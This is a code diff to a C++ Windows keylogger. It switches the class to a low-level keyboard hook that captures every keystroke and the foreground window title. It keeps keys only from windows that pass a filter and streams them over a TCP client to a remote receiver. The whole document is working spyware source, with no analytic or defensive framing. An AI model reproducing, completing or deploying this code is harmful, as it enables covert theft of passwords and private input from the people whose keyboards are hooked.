@@ -13,8 +13,18 @@ const std::vector<int> Keylogger::numpadKeys = { VK_MULTIPLY, VK_ADD, VK_SEPARAT
 const std::vector<std::vector<int>> Keylogger::trackedKeys = { specialKeys, valueKeys, numpadKeys };
 
 const std::vector<std::wstring> Keylogger::specialKeysNames = { L"{LMB}", L"{BSPC}", L"{TAB}",L"{ENTER}",L"{SHIFT}",L"{LCTRL}",
-																L"{RCTRL}",L"{ALT}",L"{ESC}",L"{DEL}",L"{LEFT}",L"{UP}",
-																L"{RIGHT}",L"{DOWN}" };
+																L"{RCTRL}",L"{ALT}",L"{ESC}",L"{DEL}",L"{LA}",L"{UA}",
+																L"{RA}",L"{DA}" };
+
+Filter* Keylogger::filter;
+TcpClient* Keylogger::client;
+
+BYTE Keylogger::states[256] = {0};
+
+HWND Keylogger::hLastTrackedWindow = NULL;
+bool Keylogger::titleUpdateRequest = false;;
+bool Keylogger::isWorthy = false;
+std::wstring Keylogger::lastTrackedWindowTitle;
 
 Keylogger::Keylogger(TcpClient* client, Filter* filter) {
 	this->filter = filter;
@@ -27,70 +37,99 @@ Keylogger::~Keylogger() {
 	this->client->Disconnect();
 }
 
+HHOOK hKeyboardHook;
 
-void Keylogger::logKeys() {
-	HWND hWindow = GetForegroundWindow();
-	HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));	
+__declspec(dllexport) LRESULT CALLBACK Keylogger::KeyboardEventHandler(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))) {
+		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
+		int key = hooked_key.vkCode;
 
-	for (unsigned int i = 0; i < trackedKeys.size(); i++) {
-		for (unsigned int j = 0; j < trackedKeys[i].size(); j++) {
-			if (GetAsyncKeyState(trackedKeys[i][j]) & 0x0001) { // key was pressed
-				
-				if (hWindow != hLastTrackedWindow || titleUpdateRequest) {
-					wchar_t windowTitle[255];
-					GetWindowTextW(hWindow, windowTitle, 255);
-					std::wstring title(windowTitle);
-					if (title != this->windowTitle) {
-						if (filter->Check(title)) {
-							isWorthy = true;
-							std::wstring message = L"\n[" + title + L"]\n\t";
-							while (!client->Send(message)) {
-								if (!client->Connect(L"", L""))
-									Sleep(1000);
-							}
-								
+		if (key == VK_RSHIFT || key == VK_LSHIFT)
+			states[VK_SHIFT] = 0x00;
+	}
 
-						}
-							
-						else
-							isWorthy = false;
-						this->windowTitle = std::wstring(windowTitle);
-					}
-					titleUpdateRequest = false;
-					hLastTrackedWindow = hWindow;
+	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
+	{
+		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
+		int key = hooked_key.vkCode;
+
+		if (key == VK_RSHIFT || key == VK_LSHIFT)
+			states[VK_SHIFT] = 0xff;
+		if (key == VK_CAPITAL)
+			states[VK_CAPITAL] ^= 0xff;
+
+
+		bool isTrackedKey = false;
+		int keyGroup = 0;
+		int keyPos = 0;
+		for (unsigned int i = 0; i < trackedKeys.size(); i++) {
+			for (unsigned int j = 0; j < trackedKeys[i].size(); j++) {
+				if (key == trackedKeys[i][j]) {
+					isTrackedKey = true;
+					keyGroup = i;
+					keyPos = j;
+					break;
 				}			
+			}
+		}
+		if (isTrackedKey) {
+			HWND hWindow = GetForegroundWindow();
+			HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));
 
-				switch (i) //key group
-				{
-				case 0:
-
-					if (isWorthy) {
-						while (!client->Send(this->specialKeysNames[j])) {
-							if (!client->Connect(L"", L""))
-								Sleep(1000);
-						}
+			if (hWindow != hLastTrackedWindow || titleUpdateRequest) {
+				wchar_t windowTitleBuf[255];
+				GetWindowTextW(hWindow, windowTitleBuf, 255);
+				std::wstring title(windowTitleBuf);
+				if (title != lastTrackedWindowTitle) {
+					if (filter->Check(title)) {
+						isWorthy = true;
+						hLastTrackedWindow = hWindow;
+						lastTrackedWindowTitle = title;
+						std::wstring message = L"\n[" + title + L"]\n\t";
+						client->Send(message);
 					}
-					titleUpdateRequest = true;
-					break;
-				case 1: //valueKeys
-				case 2:
-					wchar_t wcharBuf[2];
-					states[VK_SHIFT] = (GetAsyncKeyState(VK_RSHIFT) & 0x0001) || (GetAsyncKeyState(VK_LSHIFT) & 0x0001) ? 0xff : 0x00;
-					states[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? 0xff : 0x00;
-					ToUnicodeEx(trackedKeys[i][j], 0, states, wcharBuf, 2, 0, lang);
-
-					if (isWorthy) {
-						while (!client->Send(wcharBuf[0])) {
-							if (!client->Connect(L"", L""))
-								Sleep(1000);
-						}
-					}
-					break;
-				
+					else
+						isWorthy = false;
 				}
-				
+				else
+					isWorthy = true;
+				titleUpdateRequest = false;		
+			}
 
+			switch (keyGroup) //key group
+			{
+			case 0:
+
+				if (isWorthy)
+					client->Send(specialKeysNames[keyPos]);
+				titleUpdateRequest = true;
+				break;
+			case 1: //valueKeys
+			case 2:
+				wchar_t wcharBuf[2];
+				
+				ToUnicodeEx(trackedKeys[keyGroup][keyPos], 0, states, wcharBuf, 2, 0, lang);
+
+				if (isWorthy)
+					client->Send(wcharBuf[0]);
+				break;
 			}
 		}
 	}
+	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
+}
+
+
+void Keylogger::LogKeys()
+{
+	states[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? 0xff : 0x00;
+	HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEventHandler, NULL, NULL);
+	MSG message;
+	while (GetMessage(&message, NULL, 0, 0))
+	{
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
+	UnhookWindowsHookEx(hKeyboardHook);
 }
